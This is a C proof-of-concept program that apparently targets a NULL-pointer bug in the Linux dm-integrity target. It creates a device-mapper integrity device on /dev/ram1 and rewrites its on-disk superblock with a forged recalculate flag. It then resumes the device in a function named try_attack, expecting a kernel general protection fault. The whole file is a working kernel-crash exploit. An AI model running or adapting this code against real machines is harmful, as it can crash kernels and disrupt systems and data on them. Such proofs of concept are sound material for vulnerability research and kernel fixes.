#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <linux/dm-ioctl.h>

#define DEV "dmgap0"
#define BACKDEV "/dev/ram1"
#define SB_SECTORS 8
#define SB_BUF (SB_SECTORS * 512)

struct dm_sb {
	unsigned char magic[8];
	unsigned char version;
	unsigned char log2_interleave_sectors;
	unsigned short integrity_tag_size;
	unsigned int journal_sections;
	unsigned long long provided_data_sectors;
	unsigned int flags;
	unsigned char log2_sectors_per_block;
	unsigned char log2_blocks_per_bitmap_bit;
	unsigned char pad[2];
	unsigned long long recalc_sector;
	unsigned char pad2[8];
	unsigned char salt[16];
};

static int ctl_fd = -1;

static int dm_ioctl(int cmd, struct dm_ioctl *dmi, size_t len)
{
	int r;
	dmi->version[0] = 4;
	dmi->version[1] = 0;
	dmi->version[2] = 0;
	dmi->data_size = len;
	dmi->data_start = sizeof(struct dm_ioctl);
	r = ioctl(ctl_fd, cmd, dmi);
	if (r < 0)
		return -errno;
	return 0;
}

static int dm_ctl(int cmd, const char *name)
{
	static char buf[4096];
	struct dm_ioctl *dmi = (struct dm_ioctl *)buf;

	memset(buf, 0, sizeof(buf));
	snprintf(dmi->name, sizeof(dmi->name), "%s", name);
	if (cmd == DM_DEV_CREATE)
		dmi->flags = DM_PERSISTENT_DEV_FLAG;
	return dm_ioctl(cmd, dmi, sizeof(buf));
}

static int dm_load(const char *name, unsigned long long len, const char *spec)
{
	static char buf[8192];
	struct dm_ioctl *dmi = (struct dm_ioctl *)buf;
	struct dm_target_spec *s;
	char *p;
	size_t sl;

	memset(buf, 0, sizeof(buf));
	snprintf(dmi->name, sizeof(dmi->name), "%s", name);
	dmi->target_count = 1;

	s = (struct dm_target_spec *)(buf + sizeof(struct dm_ioctl));
	s->sector_start = 0;
	s->length = len;
	snprintf(s->target_type, sizeof(s->target_type), "integrity");

	p = (char *)s + sizeof(struct dm_target_spec);
	strcpy(p, spec);
	sl = sizeof(struct dm_target_spec) + strlen(spec) + 1;
	sl = (sl + 7) & ~7UL;

	return dm_ioctl(DM_TABLE_LOAD, dmi, sizeof(struct dm_ioctl) + sl);
}

static int dm_suspend(const char *name, int do_suspend)
{
	static char buf[4096];
	struct dm_ioctl *dmi = (struct dm_ioctl *)buf;

	memset(buf, 0, sizeof(buf));
	snprintf(dmi->name, sizeof(dmi->name), "%s", name);
	dmi->flags = do_suspend ? DM_SUSPEND_FLAG : 0;
	return dm_ioctl(DM_DEV_SUSPEND, dmi, sizeof(buf));
}

static void st(const char *tag, int rc)
{
	printf("%-42s rc=%d errno=%d\n", tag, rc, rc ? errno : 0);
	fflush(stdout);
}

static void dm_dmesg(void)
{
	printf("    --- dmesg ---\n");
	fflush(stdout);
	if (system("dmesg | grep -iE 'integrity|device-mapper|general protection|queue_work' | tail -5 | sed 's/^/    /'") < 0)
		printf("    (n/a)\n");
	fflush(stdout);
}

static int rw_sb(unsigned long long sb_off, unsigned char *buf, int wr)
{
	int fd, n;
	fd = open(BACKDEV, wr ? O_RDWR : O_RDONLY);
	if (fd < 0) {
		printf("  open %s failed errno=%d\n", BACKDEV, errno);
		return -1;
	}
	if (lseek(fd, (off_t)sb_off, SEEK_SET) < 0) {
		close(fd);
		return -1;
	}
	if (wr) {
		n = write(fd, buf, SB_BUF);
		fsync(fd);
	} else {
		n = read(fd, buf, SB_BUF);
	}
	close(fd);
	if (n != SB_BUF) {
		printf("  %s sb n=%d errno=%d\n", wr ? "write" : "read", n, errno);
		return -1;
	}
	return 0;
}

static void dump_sb(const char *tag, const struct dm_sb *sb)
{
	char m[9];
	memcpy(m, sb->magic, 8);
	m[8] = 0;
	printf("  [%s] magic=[%s] ver=%u tag=%u js=%u pds=%llu flags=0x%x recalc=%llu\n",
	       tag, m, sb->version, sb->integrity_tag_size,
	       sb->journal_sections, sb->provided_data_sectors,
	       sb->flags, sb->recalc_sector);
	fflush(stdout);
}

static int try_attack(unsigned long long len, unsigned long long start, const char *spec)
{
	unsigned char buf[SB_BUF];
	struct dm_sb *sb = (struct dm_sb *)buf;
	int rc;

	printf("\n=== len=%llu spec=\"%s\" ===\n", len, spec);
	fflush(stdout);

	dm_ctl(DM_DEV_REMOVE, DEV);
	dm_ctl(DM_DEV_CREATE, DEV);

	rc = dm_load(DEV, len, spec);
	st("LOAD", rc);
	if (rc) {
		dm_dmesg();
		dm_ctl(DM_DEV_REMOVE, DEV);
		return -1;
	}

	rc = dm_suspend(DEV, 0);
	st("resume #1", rc);
	if (rc) {
		dm_dmesg();
		dm_ctl(DM_DEV_REMOVE, DEV);
		return -1;
	}

	dm_suspend(DEV, 1);
	st("suspend", 0);

	if (rw_sb(start * 512, buf, 0) != 0) {
		dm_ctl(DM_DEV_REMOVE, DEV);
		return -1;
	}
	dump_sb("before", sb);

	if (memcmp(sb->magic, "integrt", 7) != 0) {
		printf("  magic mismatch, skip\n");
		dm_suspend(DEV, 0);
		dm_ctl(DM_DEV_REMOVE, DEV);
		return -1;
	}

	sb->flags |= 2;
	sb->recalc_sector = 0;
	dump_sb("after ", sb);

	if (rw_sb(start * 512, buf, 1) != 0) {
		dm_ctl(DM_DEV_REMOVE, DEV);
		return -1;
	}
	st("tampered sb written", 0);

	printf("  >>> RESUME (expect GPF) <<<\n");
	fflush(stdout);
	rc = dm_suspend(DEV, 0);
	st("resume #2", rc);

	printf("  --- survived ---\n");
	dm_dmesg();
	dm_ctl(DM_DEV_REMOVE, DEV);
	return 0;
}

int main(void)
{
	setvbuf(stdout, NULL, _IONBF, 0);
	printf("=== DM-INTEGRITY RECALC_WQ NULL POC v2 ===\n");

	ctl_fd = open("/dev/mapper/control", O_RDWR);
	if (ctl_fd < 0) {
		printf("open control errno=%d\n", errno);
		return 1;
	}
	printf("control fd=%d\n", ctl_fd);

	try_attack(64, 8, "/dev/ram1 8 4 J 1 journal_sectors:8");
	try_attack(128, 8, "/dev/ram1 8 4 J 1 journal_sectors:8");
	try_attack(256, 8, "/dev/ram1 8 4 J 1 journal_sectors:8");
	try_attack(512, 8, "/dev/ram1 8 4 J 1 journal_sectors:8");
	try_attack(2048, 8, "/dev/ram1 8 4 J 1 journal_sectors:8");
	try_attack(4096, 8, "/dev/ram1 8 4 J 1 journal_sectors:8");

	printf("\n=== POC DONE ===\n");
	close(ctl_fd);
	return 0;
}